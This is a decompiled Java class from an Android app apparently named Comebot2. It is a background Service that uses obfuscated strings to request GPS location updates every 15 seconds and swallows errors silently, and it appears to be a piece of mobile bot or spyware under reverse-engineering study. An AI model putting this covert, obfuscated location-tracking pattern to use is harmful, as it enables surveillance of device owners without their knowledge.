package anu_bispro.app;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;

public class GPS extends Service {
  b a = new b();
  
  a b = new a();
  
  public LocationManager c;
  
  d d = new d();
  
  private LocationListener e = new a(this);
  
  public IBinder onBind(Intent paramIntent) {
    return null;
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
    this.c = (LocationManager)getSystemService(c.a("\nb\005l\022d\tc"));
    try {
      this.c.requestLocationUpdates(d.a("A\000U"), 15000L, 10.0F, this.e);
    } catch (Exception exception) {}
    return paramInt1;
  }
  
  class a implements LocationListener {
    a(GPS this$0) {}
    
    public void onLocationChanged(Location param1Location) {
      GPS.a(this.a, param1Location);
    }
    
    public void onProviderDisabled(String param1String) {}
    
    public void onProviderEnabled(String param1String) {}
    
    public void onStatusChanged(String param1String, int param1Int, Bundle param1Bundle) {}
  }
}


/* Location:              /home/fahim/Desktop/Comebot2-dex2jar.jar!/anu_bispro/app/GPS.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */